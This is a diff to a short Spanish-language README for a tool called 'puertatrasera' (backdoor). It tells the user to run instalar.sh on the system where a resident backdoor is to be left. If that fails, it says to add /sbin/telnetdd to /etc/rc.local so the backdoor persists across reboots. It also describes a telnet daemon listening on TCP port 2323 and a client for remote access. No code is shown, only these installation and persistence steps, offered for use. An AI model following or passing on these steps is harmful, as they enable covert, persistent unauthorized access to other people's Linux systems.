@@ -1,9 +1,14 @@
 # puertatrasera
 
-instalar.sh ( Ejecutar sh instalar.sh para instalar en el sistema que queremos dejar el backdoor residente ).
+# instalar.sh ( Ejecutar sh instalar.sh para instalar en el sistema que queremos dejar el backdoor residente ). 
+Sino funciona editamos el fichero rc.local e incluimos la linea con el scipt.
 
-telnetd ( Se instala como un proceso en Linux. Puerto tcp 2323 )
+vi /etc/rc.local
 
-telnetcliente IP ( cliente telnet para acceder )
+/sbin/telnetdd
+
+# telnetdd ( Se instala como un proceso en Linux. Puerto tcp 2323 )
+
+# telnetcliente IP ( cliente telnet para acceder )
 
 
